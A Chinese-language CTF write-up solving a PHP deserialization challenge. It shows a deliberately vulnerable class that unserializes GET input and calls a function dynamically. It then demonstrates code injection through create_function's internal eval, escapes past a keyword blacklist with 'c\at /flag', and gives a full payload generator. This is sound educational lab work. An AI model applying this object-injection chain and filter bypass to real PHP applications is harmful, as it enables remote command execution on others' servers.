---
tags:
  - 题目
  - CTF
  - 反序列化
---
```php
<?php

if (isset($_GET['p'])) {
    $p = unserialize($_GET['p']);
}
show_source("index.php");


class Noteasy
{
    private $a;
    private $b;

    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
        $this->check($a.$b);
        eval($a.$b);
    }


    public function __destruct()
    {
        $a = (string)$this->a;
        $b = (string)$this->b;
        $this->check($a.$b);
        $a("", $b);
    }


    private function check($str)
    {
        if (preg_match_all("(ls|find|cat|grep|head|tail|echo)", $str) > 0) die("You are a hacker, get out");
    }


    public function setAB($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}
```

很明显，入口点是 `__destruct()` ，在这个函数里，有个检测，然后会动态调用函数。
`$a("", $b);` 
没有现有的函数可以调用，那就只能调用php自带的函数了。
但是，他这里把第一个参数给搞成空字符串了，还有什么函数可用呢？
常见的什么 `system()` `eval()` 是用不了了
不过 `create_function()` 可以使用
他的定义是
```php
<?php
function create_function(string $args, string $code): string
```

| 参数名    | 类型     | 说明                                 |
| ------ | ------ | ---------------------------------- |
| `args` | string | 用逗号分隔的参数名称列表，格式如 `"x,y"` 或 `$a,$b` |
| `code` | string | 要执行的代码字符串（不包括 `<?php ... ?>` 标签）   |
|        |        |                                    |

这个 `create_function()` 声明函数的底层原理使用的是 `eval()` ！
```php
eval("function __lambda_func($args) { $code }");
```
类似**SQL注入**，我们可以用闭合符和注释执行我们自己的代码！
例如， `$code="}system('id');/*"`
那么实际上执行的是
```php
eval("function __lambda_func($args) { }system('id');/* }");
```

回到题目，想要在shell执行 `id` ，只需要 `$a=create_function` `$b=}system('id');/*`

但是 `check()` 还过滤掉了一些命令，但绕过很简单，加几个转义符他就匹配不到了。
按照如下方式构造payload
```php
<?php

class Noteasy
{
    private $a = "create_function";
    private $b = "}system('c\at /flag');/*";

    public function __destruct()
    {
        $a = (string)$this->a;
        $b = (string)$this->b;
        $this->check($a.$b);
        $a("", $b);
    }


    private function check($str)
    {
        if (preg_match_all("(ls|find|cat|grep|head|tail|echo)", $str) > 0) die("You are a hacker, get out");
    }


    public function setAB($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$fuck = new Noteasy();
echo(urlencode(serialize($fuck)));

?>
```
